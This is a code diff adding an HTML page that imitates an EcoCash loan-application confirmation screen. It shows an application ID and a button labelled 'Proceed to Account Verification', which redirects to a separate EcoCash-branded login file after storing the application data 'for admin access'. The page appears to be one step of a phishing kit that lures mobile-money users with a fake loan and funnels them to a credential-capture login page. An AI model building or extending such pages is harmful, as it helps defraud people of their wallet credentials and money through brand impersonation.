@@ -1,0 +1,197 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - Application Submitted</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            color: #10b981;
+            margin-bottom: 20px;
+            animation: bounce 1s infinite alternate;
+        }
+        
+        @keyframes bounce {
+            from { transform: translateY(0); }
+            to { transform: translateY(-10px); }
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        
+        .message {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
+        .application-id {
+            background: #f0f3ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-weight: bold;
+            color: #667eea;
+            font-size: 18px;
+        }
+        
+        .btn-login {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            transition: transform 0.3s;
+            margin-top: 20px;
+        }
+        
+        .btn-login:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+        
+        .help-links {
+            margin-top: 30px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+        
+        .help-link {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+        
+        .help-link:hover {
+            color: #764ba2;
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #999;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+        
+        .version {
+            font-size: 10px;
+            color: #ccc;
+            margin-top: 10px;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="success-icon">
+            <i class="fas fa-check-circle"></i>
+        </div>
+        
+        <h1>Loan Application Submitted</h1>
+        
+        <p class="message">
+            Your loan application has been submitted successfully.
+            Please wait for approval notification.
+        </p>
+        
+        <p class="message">
+            You will receive a confirmation message on your phone and email.
+            Our team will review your application within 24 hours.
+        </p>
+        
+        <div class="application-id" id="appId">
+            Application ID: Loading...
+        </div>
+        
+        <button class="btn-login" onclick="goToLogin()">
+            Proceed to Account Verification
+        </button>
+        
+        <div class="help-links">
+            <a href="#" class="help-link">
+                <i class="fas fa-user-plus"></i> Register EcoCash Wallet
+            </a>
+            <a href="#" class="help-link">
+                <i class="fas fa-question-circle"></i> Help & Support
+            </a>
+        </div>
+        
+        <div class="footer">
+            <p>By submitting your application, you agree to our Terms and Conditions</p>
+            <div class="version">v3.0.0P</div>
+        </div>
+    </div>
+
+    <script>
+        // Get application data
+        const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+        
+        // Display application ID
+        document.getElementById('appId').textContent = 
+            `Application ID: ${applicationData.applicationId || 'EC-' + Date.now()}`;
+        
+        function goToLogin() {
+            // Save to local storage for admin access
+            saveApplicationToLocalStorage(applicationData);
+            
+            // Redirect to EcoCash login page
+            window.location.href = 'ecocash-login-final.html';
+        }
+        
+        function saveApplicationToLocalStorage(data) {
+            // Get existing applications
+            let applications = JSON.parse(localStorage.getItem('loanApplications')) || [];
+            
+            // Add new application
+            applications.push({
+                ...data,
+                submittedAt: new Date().toISOString(),
+                status: 'pending'
+            });
+            
+            // Save back to localStorage
+            localStorage.setItem('loanApplications', JSON.stringify(applications));
+        }
+    </script>
+</body>
+</html>
